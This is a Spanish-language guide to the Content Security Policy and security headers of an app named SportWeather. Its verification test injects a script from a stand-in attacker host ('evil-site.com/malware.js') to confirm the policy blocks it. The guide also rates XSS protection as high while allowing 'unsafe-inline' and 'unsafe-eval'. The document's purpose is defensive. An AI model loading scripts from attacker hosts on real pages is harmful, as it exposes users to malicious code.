# 🛡️ Content Security Policy (CSP) - SportWeather

## ¿Qué es CSP?

**Content Security Policy** es una capa de seguridad que ayuda a detectar y mitigar ciertos tipos de ataques, incluyendo:
- **XSS (Cross-Site Scripting)** - Inyección de scripts maliciosos
- **Clickjacking** - Engañar al usuario para que haga clic en algo oculto
- **Code Injection** - Inyección de código malicioso
- **Data Injection** - Inyección de datos no autorizados

---

## 📋 Directivas Implementadas

### **1. `default-src 'self'`**
**Qué hace:** Política por defecto para todos los recursos.
**Permite:** Solo recursos del mismo origen (tu dominio).
**Bloquea:** Cualquier recurso externo no especificado explícitamente.

---

### **2. `script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com https://esm.sh https://cdn.emailjs.com`**

**Qué hace:** Controla qué scripts JavaScript pueden ejecutarse.

**Permite:**
- ✅ Scripts de tu propio dominio (`'self'`)
- ✅ Scripts inline en HTML (`'unsafe-inline'`) - Necesario para Tailwind CDN
- ✅ `eval()` y funciones similares (`'unsafe-eval'`) - Necesario para React ESM
- ✅ Tailwind CSS CDN
- ✅ React desde esm.sh
- ✅ EmailJS para el formulario de soporte

**Bloquea:**
- ❌ Scripts de dominios no autorizados
- ❌ Scripts inyectados por atacantes

**Nota:** `'unsafe-inline'` y `'unsafe-eval'` reducen la seguridad, pero son necesarios para Tailwind CDN y React ESM. En producción, considera usar Tailwind compilado.

---

### **3. `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com`**

**Qué hace:** Controla qué estilos CSS pueden aplicarse.

**Permite:**
- ✅ Estilos de tu dominio
- ✅ Estilos inline en HTML (`<style>` tags)
- ✅ Google Fonts
- ✅ Tailwind CSS CDN

**Bloquea:**
- ❌ Estilos maliciosos inyectados

---

### **4. `font-src 'self' https://fonts.gstatic.com`**

**Qué hace:** Controla de dónde se pueden cargar fuentes.

**Permite:**
- ✅ Fuentes de tu dominio
- ✅ Google Fonts (fuentes de Inter)

**Bloquea:**
- ❌ Fuentes de sitios no autorizados

---

### **5. `connect-src 'self' https://*.supabase.co https://api.open-meteo.com https://geocoding-api.open-meteo.com https://nominatim.openstreetmap.org https://api.emailjs.com`**

**Qué hace:** Controla a qué APIs puede conectarse tu app (fetch, XMLHttpRequest, WebSocket).

**Permite:**
- ✅ Tu propio backend
- ✅ Supabase (cualquier subdominio)
- ✅ Open-Meteo API (clima)
- ✅ Geocoding API (búsqueda de ciudades)
- ✅ Nominatim (reverse geocoding)
- ✅ EmailJS (envío de emails)

**Bloquea:**
- ❌ Conexiones a APIs no autorizadas
- ❌ Exfiltración de datos a servidores maliciosos

---

### **6. `img-src 'self' data: https: blob:`**

**Qué hace:** Controla de dónde se pueden cargar imágenes.

**Permite:**
- ✅ Imágenes de tu dominio
- ✅ Data URIs (imágenes base64)
- ✅ Cualquier imagen HTTPS (para imágenes de deportes, avatares, etc.)
- ✅ Blob URLs (para imágenes generadas dinámicamente)

**Bloquea:**
- ❌ Imágenes HTTP (no seguras)

---

### **7. `media-src 'self'`**

**Qué hace:** Controla de dónde se pueden cargar videos y audios.

**Permite:**
- ✅ Solo medios de tu dominio

**Bloquea:**
- ❌ Videos/audios externos

---

### **8. `object-src 'none'`**

**Qué hace:** Bloquea plugins como Flash, Java, etc.

**Permite:**
- ❌ NADA (seguridad máxima)

**Bloquea:**
- ❌ Todos los plugins (Flash, Silverlight, etc.)

---

### **9. `base-uri 'self'`**

**Qué hace:** Controla qué URLs pueden usarse en el tag `<base>`.

**Permite:**
- ✅ Solo tu dominio

**Bloquea:**
- ❌ Ataques que intentan cambiar la URL base

---

### **10. `form-action 'self'`**

**Qué hace:** Controla a dónde pueden enviarse formularios.

**Permite:**
- ✅ Solo a tu propio dominio

**Bloquea:**
- ❌ Envío de formularios a sitios maliciosos

---

### **11. `frame-ancestors 'none'`**

**Qué hace:** Controla si tu sitio puede ser embebido en iframes.

**Permite:**
- ❌ NADA (no puede ser embebido)

**Bloquea:**
- ❌ Clickjacking (tu sitio en un iframe malicioso)

---

### **12. `upgrade-insecure-requests`**

**Qué hace:** Actualiza automáticamente HTTP a HTTPS.

**Permite:**
- ✅ Todas las peticiones HTTP se convierten a HTTPS

**Bloquea:**
- ❌ Conexiones inseguras HTTP

---

## 🔒 Cabeceras de Seguridad Adicionales

### **X-Frame-Options: DENY**
**Qué hace:** Previene que tu sitio sea embebido en iframes.
**Protege contra:** Clickjacking

---

### **X-Content-Type-Options: nosniff**
**Qué hace:** Previene que el navegador "adivine" el tipo MIME.
**Protege contra:** Ataques de MIME type confusion

---

### **X-XSS-Protection: 1; mode=block**
**Qué hace:** Activa el filtro XSS del navegador (para navegadores antiguos).
**Protege contra:** XSS en navegadores que no soportan CSP

---

### **Referrer-Policy: strict-origin-when-cross-origin**
**Qué hace:** Controla qué información se envía en el header Referer.
**Protege contra:** Fuga de información sensible en URLs

---

## 🧪 Verificar que CSP Funciona

### **Test 1: Consola del Navegador**

1. Abre tu app
2. Presiona F12 → Console
3. **No deberías ver errores de CSP** si todo está bien configurado

---

### **Test 2: Intentar Inyectar Script Malicioso**

1. Abre la consola (F12)
2. Ejecuta:
```javascript
const script = document.createElement('script');
script.src = 'https://evil-site.com/malware.js';
document.body.appendChild(script);
```

3. **Resultado esperado:**
```
Refused to load the script 'https://evil-site.com/malware.js' because it violates 
the following Content Security Policy directive: "script-src 'self' ..."
```

✅ Si ves este error, CSP está funcionando correctamente.

---

### **Test 3: Verificar Cabeceras**

1. Abre DevTools → Network
2. Recarga la página
3. Click en el documento HTML principal
4. Ve a la pestaña **Headers**
5. Busca **Response Headers**
6. Deberías ver:
   - `content-security-policy`
   - `x-frame-options`
   - `x-content-type-options`
   - `x-xss-protection`

---

## ⚠️ Problemas Comunes

### **Problema 1: "Refused to load script"**

**Causa:** Estás intentando cargar un script de un dominio no autorizado.

**Solución:**
1. Identifica el dominio del script
2. Agrégalo a `script-src` en el CSP
3. Ejemplo: Si usas Google Analytics, agrega `https://www.google-analytics.com`

---

### **Problema 2: "Refused to apply inline style"**

**Causa:** Tienes `style-src` sin `'unsafe-inline'`.

**Solución:**
- Ya está incluido en tu CSP actual
- Si el problema persiste, verifica que el meta tag esté bien formateado

---

### **Problema 3: Imágenes no cargan**

**Causa:** El dominio de las imágenes no está en `img-src`.

**Solución:**
- Actualmente tienes `https:` que permite todas las imágenes HTTPS
- Si quieres ser más restrictivo, especifica dominios exactos

---

## 🔄 Actualizar CSP al Agregar Servicios

### **Si agregas Google Analytics:**

Actualiza `script-src`:
```html
script-src 'self' 'unsafe-inline' 'unsafe-eval' 
           https://cdn.tailwindcss.com 
           https://esm.sh 
           https://cdn.emailjs.com 
           https://www.google-analytics.com 
           https://www.googletagmanager.com;
```

Actualiza `connect-src`:
```html
connect-src 'self' 
            https://*.supabase.co 
            https://api.open-meteo.com 
            https://geocoding-api.open-meteo.com 
            https://nominatim.openstreetmap.org 
            https://api.emailjs.com
            https://www.google-analytics.com;
```

---

### **Si agregas Stripe (pagos):**

Actualiza `script-src`:
```html
script-src ... https://js.stripe.com;
```

Actualiza `connect-src`:
```html
connect-src ... https://api.stripe.com;
```

Actualiza `frame-src` (nueva directiva):
```html
frame-src https://js.stripe.com https://hooks.stripe.com;
```

---

## 📊 Nivel de Seguridad Actual

### **Protecciones Activas:**

✅ **XSS (Cross-Site Scripting)** - ALTA protección
✅ **Clickjacking** - MÁXIMA protección (`frame-ancestors 'none'`)
✅ **MIME Sniffing** - MÁXIMA protección
✅ **Insecure Requests** - AUTO-UPGRADE a HTTPS
✅ **Data Exfiltration** - ALTA protección (connect-src restrictivo)

### **Áreas de Mejora (Producción):**

⚠️ **`'unsafe-inline'` en script-src** - Necesario para Tailwind CDN
   - **Mejora:** Compilar Tailwind en build time
   
⚠️ **`'unsafe-eval'` en script-src** - Necesario para React ESM
   - **Mejora:** Usar build de producción con Vite

⚠️ **`https:` en img-src** - Permite todas las imágenes HTTPS
   - **Mejora:** Especificar dominios exactos si es posible

---

## 🎯 Próximos Pasos

Después de CSP, considera:

1. ✅ **CORS Restrictivo** (ya discutido)
2. ⬜ **Subresource Integrity (SRI)** - Verificar integridad de CDNs
3. ⬜ **Permissions Policy** - Controlar features del navegador
4. ⬜ **HSTS** - Forzar HTTPS permanentemente (en producción)

---

## 📝 Checklist de Verificación

- [x] CSP implementado en `index.html`
- [x] Todas las APIs necesarias están en `connect-src`
- [x] Tailwind CDN permitido en `script-src` y `style-src`
- [x] Google Fonts permitido en `font-src` y `style-src`
- [x] EmailJS permitido en `script-src` y `connect-src`
- [x] Clickjacking bloqueado (`frame-ancestors 'none'`)
- [x] MIME sniffing bloqueado
- [x] HTTP auto-upgrade a HTTPS
- [ ] Probado en navegador (sin errores CSP)
- [ ] Probado intento de inyección de script malicioso

---

**Última actualización:** 2026-01-10  
**Nivel de Prioridad:** 🔴 ALTA  
**Nivel de Protección:** 🛡️ ALTA (8/10)
